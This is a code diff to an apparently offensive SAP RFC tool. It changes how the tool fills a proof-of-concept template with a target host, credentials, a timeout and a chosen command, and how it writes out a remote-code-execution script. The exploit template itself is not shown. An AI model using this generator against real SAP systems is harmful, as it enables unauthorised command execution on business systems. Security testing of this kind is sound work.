@@ -60,7 +60,7 @@ def parse_args() -> argparse.Namespace:
 
     parser.add_argument(
         "--no-trace",
-        action="store_false",
+        action="store_true",
         help="Disable SAP RFC trace logging",
     )
 
@@ -87,10 +87,6 @@ def main() -> int:
     """Run the interactive console application."""
     print(methods.banner())
 
-    if not methods.check_nwrfc_sdk():
-        print(methods.nwrfc_sdk_tips())
-        return 1
-
     args = parse_args()
 
     if args.rce_poc is not None:
@@ -101,15 +97,31 @@ def main() -> int:
 
         print(f"[i] Producing PoC code for command: {args.rce_poc}")
         command = args.rce_poc
+
         with open(poc_code, "r", encoding="utf-8") as file:
             poc_template = file.read()
             poc_template = poc_template.replace("<USERNAME>", args.username)
             poc_template = poc_template.replace("<PASSWORD>", args.password)
             poc_template = poc_template.replace("<HOST>", args.target)
-            poc_template = poc_template.replace("<GROUP>", args.group)
             poc_template = poc_template.replace("<SYSNR>", args.sysnr)
             poc_template = poc_template.replace("<CLIENT>", args.client)
             poc_template = poc_template.replace("<SAP_COMMAND>", command)
+            poc_template = poc_template.replace("<TIMEOUT>", str(args.timeout))
+
+            # Conditionally add group parameter
+            if args.group is not None:
+                group_param = f'conn_params["group"] = "{args.group}"'
+            else:
+                group_param = "# No group specified"
+            poc_template = poc_template.replace("<GROUP_PARAM>", group_param)
+
+            # Conditionally add trace parameter
+            if not args.no_trace:
+                trace_param = 'conn_params["trace"] = "3"'
+            else:
+                trace_param = "# Trace disabled"
+
+            poc_template = poc_template.replace("<TRACE_PARAM>", trace_param)
 
             poc_file = Path.cwd() / f"poc_{args.target}_{command}.py"
             poc_file.unlink(missing_ok=True)
@@ -118,6 +130,10 @@ def main() -> int:
             print(f"[i] PoC code written to: {poc_file}")
 
         return 0
+
+    if not methods.check_nwrfc_sdk():
+        print(methods.nwrfc_sdk_tips())
+        return 1
 
     print(f"[i] Connecting to SAP system: {args.target}")
     print(f"|-> Timeout: {args.timeout}s")
